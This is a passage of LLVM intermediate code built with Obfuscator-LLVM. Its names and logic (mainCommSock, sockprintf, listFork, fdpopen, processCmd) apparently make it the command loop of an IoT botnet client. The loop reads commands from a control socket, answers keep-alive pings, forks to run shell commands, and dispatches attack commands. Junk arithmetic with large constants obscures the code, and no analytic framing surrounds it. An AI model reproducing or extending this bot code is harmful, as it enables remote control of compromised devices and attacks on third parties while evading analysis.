  call void @trim(i8* %216)
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %218 = call i8* @strstr(i8* %217, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0)) #10
  %219 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %220 = icmp eq i8* %218, %219
  br i1 %220, label %221, label %224

; <label>:221:                                    ; preds = %212
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = call i32 (i32, i8*, ...) @sockprintf(i32 %222, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0))
  br label %104

; <label>:224:                                    ; preds = %212
  %225 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %226 = call i8* @strstr(i8* %225, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #10
  %227 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %228 = icmp eq i8* %226, %227
  br i1 %228, label %229, label %230

; <label>:229:                                    ; preds = %224
  call void @exit(i32 0) #14
  unreachable

; <label>:230:                                    ; preds = %224
  %231 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %231, i8** %15, align 8
  %232 = load i8*, i8** %15, align 8
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 33
  br i1 %235, label %236, label %435

; <label>:236:                                    ; preds = %230
  %237 = load i8*, i8** %15, align 8
  %238 = getelementptr inbounds i8, i8* %237, i64 1
  store i8* %238, i8** %16, align 8
  br label %239

; <label>:239:                                    ; preds = %251, %236
  %240 = load i8*, i8** %16, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp ne i32 %242, 32
  br i1 %243, label %244, label %249

; <label>:244:                                    ; preds = %239
  %245 = load i8*, i8** %16, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp ne i32 %247, 0
  br label %249

; <label>:249:                                    ; preds = %244, %239
  %250 = phi i1 [ false, %239 ], [ %248, %244 ]
  br i1 %250, label %251, label %254

; <label>:251:                                    ; preds = %249
  %252 = load i8*, i8** %16, align 8
  %253 = getelementptr inbounds i8, i8* %252, i32 1
  store i8* %253, i8** %16, align 8
  br label %239

; <label>:254:                                    ; preds = %249
  %255 = load i8*, i8** %16, align 8
  %256 = load i8, i8* %255, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp eq i32 %257, 0
  br i1 %258, label %259, label %260

; <label>:259:                                    ; preds = %254
  br label %104

; <label>:260:                                    ; preds = %254
  %261 = load i8*, i8** %16, align 8
  store i8 0, i8* %261, align 1
  %262 = load i8*, i8** %15, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 1
  store i8* %263, i8** %16, align 8
  %264 = load i8*, i8** %15, align 8
  %265 = load i8*, i8** %16, align 8
  %266 = call i64 @strlen(i8* %265) #10
  %267 = getelementptr inbounds i8, i8* %264, i64 %266
  %268 = getelementptr inbounds i8, i8* %267, i64 2
  store i8* %268, i8** %15, align 8
  br label %269

; <label>:269:                                    ; preds = %293, %260
  %270 = load i8*, i8** %15, align 8
  %271 = load i8*, i8** %15, align 8
  %272 = call i64 @strlen(i8* %271) #10
  %273 = sub i64 0, 1
  %274 = add i64 %272, %273
  %275 = sub i64 %272, 1
  %276 = getelementptr inbounds i8, i8* %270, i64 %274
  %277 = load i8, i8* %276, align 1
  %278 = zext i8 %277 to i32
  %279 = icmp eq i32 %278, 10
  br i1 %279, label %291, label %280

; <label>:280:                                    ; preds = %269
  %281 = load i8*, i8** %15, align 8
  %282 = load i8*, i8** %15, align 8
  %283 = call i64 @strlen(i8* %282) #10
  %284 = sub i64 0, 1
  %285 = add i64 %283, %284
  %286 = sub i64 %283, 1
  %287 = getelementptr inbounds i8, i8* %281, i64 %285
  %288 = load i8, i8* %287, align 1
  %289 = zext i8 %288 to i32
  %290 = icmp eq i32 %289, 13
  br label %291

; <label>:291:                                    ; preds = %280, %269
  %292 = phi i1 [ true, %269 ], [ %290, %280 ]
  br i1 %292, label %293, label %302

; <label>:293:                                    ; preds = %291
  %294 = load i8*, i8** %15, align 8
  %295 = load i8*, i8** %15, align 8
  %296 = call i64 @strlen(i8* %295) #10
  %297 = add i64 %296, 786633468863664292
  %298 = sub i64 %297, 1
  %299 = sub i64 %298, 786633468863664292
  %300 = sub i64 %296, 1
  %301 = getelementptr inbounds i8, i8* %294, i64 %299
  store i8 0, i8* %301, align 1
  br label %269

; <label>:302:                                    ; preds = %291
  %303 = load i8*, i8** %15, align 8
  store i8* %303, i8** %17, align 8
  br label %304

; <label>:304:                                    ; preds = %316, %302
  %305 = load i8*, i8** %15, align 8
  %306 = load i8, i8* %305, align 1
  %307 = zext i8 %306 to i32
  %308 = icmp ne i32 %307, 32
  br i1 %308, label %309, label %314

; <label>:309:                                    ; preds = %304
  %310 = load i8*, i8** %15, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp ne i32 %312, 0
  br label %314

; <label>:314:                                    ; preds = %309, %304
  %315 = phi i1 [ false, %304 ], [ %313, %309 ]
  br i1 %315, label %316, label %319

; <label>:316:                                    ; preds = %314
  %317 = load i8*, i8** %15, align 8
  %318 = getelementptr inbounds i8, i8* %317, i32 1
  store i8* %318, i8** %15, align 8
  br label %304

; <label>:319:                                    ; preds = %314
  %320 = load i8*, i8** %15, align 8
  store i8 0, i8* %320, align 1
  %321 = load i8*, i8** %15, align 8
  %322 = getelementptr inbounds i8, i8* %321, i32 1
  store i8* %322, i8** %15, align 8
  %323 = load i8*, i8** %17, align 8
  store i8* %323, i8** %18, align 8
  br label %324

; <label>:324:                                    ; preds = %328, %319
  %325 = load i8*, i8** %18, align 8
  %326 = load i8, i8* %325, align 1
  %327 = icmp ne i8 %326, 0
  br i1 %327, label %328, label %337

; <label>:328:                                    ; preds = %324
  %329 = load i8*, i8** %18, align 8
  %330 = load i8, i8* %329, align 1
  %331 = zext i8 %330 to i32
  %332 = call i32 @toupper(i32 %331) #10
  %333 = trunc i32 %332 to i8
  %334 = load i8*, i8** %18, align 8
  store i8 %333, i8* %334, align 1
  %335 = load i8*, i8** %18, align 8
  %336 = getelementptr inbounds i8, i8* %335, i32 1
  store i8* %336, i8** %18, align 8
  br label %324

; <label>:337:                                    ; preds = %324
  %338 = load i8*, i8** %17, align 8
  %339 = call i32 @strcmp(i8* %338, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.108, i32 0, i32 0)) #10
  %340 = icmp eq i32 %339, 0
  br i1 %340, label %341, label %364

; <label>:341:                                    ; preds = %337
  %342 = call i32 @listFork()
  %343 = icmp ne i32 %342, 0
  br i1 %343, label %344, label %345

; <label>:344:                                    ; preds = %341
  br label %104

; <label>:345:                                    ; preds = %341
  %346 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %346, i8 0, i64 1024, i32 16, i1 false)
  %347 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %348 = load i8*, i8** %15, align 8
  %349 = call i32 (i8*, i8*, ...) @szprintf(i8* %347, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0), i8* %348)
  %350 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %351 = call i32 @fdpopen(i8* %350, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0))
  store i32 %351, i32* %20, align 4
  br label %352

; <label>:352:                                    ; preds = %357, %345
  %353 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %354 = load i32, i32* %20, align 4
  %355 = call i8* @fdgets(i8* %353, i32 1024, i32 %354)
  %356 = icmp ne i8* %355, null
  br i1 %356, label %357, label %361

; <label>:357:                                    ; preds = %352
  %358 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %358)
  %359 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %359, i8 0, i64 1024, i32 16, i1 false)
  %360 = call i32 @sleep(i32 1)
  br label %352

; <label>:361:                                    ; preds = %352
  %362 = load i32, i32* %20, align 4
  %363 = call i32 @fdpclose(i32 %362)
  call void @exit(i32 0) #14
  unreachable

; <label>:364:                                    ; preds = %337
  store i32 1, i32* %22, align 4
  %365 = load i8*, i8** %15, align 8
  %366 = call i8* @strtok(i8* %365, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0)) #2
  store i8* %366, i8** %23, align 8
  %367 = load i8*, i8** %17, align 8
  %368 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %367, i8** %368, align 16
  br label %369

; <label>:369:                                    ; preds = %410, %364
  %370 = load i8*, i8** %23, align 8
  %371 = icmp ne i8* %370, null
  br i1 %371, label %372, label %412

; <label>:372:                                    ; preds = %369
  %373 = load i8*, i8** %23, align 8
  %374 = load i8, i8* %373, align 1
  %375 = zext i8 %374 to i32
  %376 = icmp ne i32 %375, 10
  br i1 %376, label %377, label %410

; <label>:377:                                    ; preds = %372
  %378 = load i8*, i8** %23, align 8
  %379 = call i64 @strlen(i8* %378) #10
  %380 = sub i64 0, %379
  %381 = sub i64 0, 1
  %382 = add i64 %380, %381
  %383 = sub i64 0, %382
  %384 = add i64 %379, 1
  %385 = call noalias i8* @malloc(i64 %383) #2
  %386 = load i32, i32* %22, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %387
  store i8* %385, i8** %388, align 8
  %389 = load i32, i32* %22, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %390
  %392 = load i8*, i8** %391, align 8
  %393 = load i8*, i8** %23, align 8
  %394 = call i64 @strlen(i8* %393) #10
  %395 = sub i64 0, %394
  %396 = sub i64 0, 1
  %397 = add i64 %395, %396
  %398 = sub i64 0, %397
  %399 = add i64 %394, 1
  call void @llvm.memset.p0i8.i64(i8* %392, i8 0, i64 %398, i32 1, i1 false)
  %400 = load i32, i32* %22, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %401
  %403 = load i8*, i8** %402, align 8
  %404 = load i8*, i8** %23, align 8
  %405 = call i8* @strcpy(i8* %403, i8* %404) #2
  %406 = load i32, i32* %22, align 4
  %407 = sub i32 0, 1
  %408 = sub i32 %406, %407
  %409 = add nsw i32 %406, 1
  store i32 %408, i32* %22, align 4
  br label %410

; <label>:410:                                    ; preds = %377, %372
  %411 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0)) #2
  store i8* %411, i8** %23, align 8
  br label %369

; <label>:412:                                    ; preds = %369
  %413 = load i32, i32* %22, align 4
  %414 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %413, i8** %414)
  %415 = load i32, i32* %22, align 4
  %416 = icmp sgt i32 %415, 1
  br i1 %416, label %417, label %434

; <label>:417:                                    ; preds = %412
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %418

; <label>:418:                                    ; preds = %427, %417
  %419 = load i32, i32* %24, align 4
  %420 = load i32, i32* %22, align 4
  %421 = icmp slt i32 %419, %420
  br i1 %421, label %422, label %433

; <label>:422:                                    ; preds = %418
  %423 = load i32, i32* %24, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %424
  %426 = load i8*, i8** %425, align 8
  call void @free(i8* %426) #2
  br label %427

; <label>:427:                                    ; preds = %422
  %428 = load i32, i32* %24, align 4
  %429 = sub i32 %428, 1729636779
  %430 = add i32 %429, 1
  %431 = add i32 %430, 1729636779
  %432 = add nsw i32 %428, 1
  store i32 %431, i32* %24, align 4
  br label %418

; <label>:433:                                    ; preds = %418
  br label %434

; <label>:434:                                    ; preds = %433, %412
  br label %435

; <label>:435:                                    ; preds = %434, %230
  br label %104

; <label>:436:                                    ; preds = %104
  br label %95
                                                  ; No predecessors!
  %438 = load i32, i32* %3, align 4
  ret i32 %438
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #4

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612306}
!2 = !{i32 -2146611615}
!3 = !{i32 -2146610866}
!4 = !{i32 -2146610043}
!5 = !{i32 -2146609223}
!6 = !{i32 -2146607762}
!7 = !{i32 -2146606900}
!8 = !{i32 -2146606179}
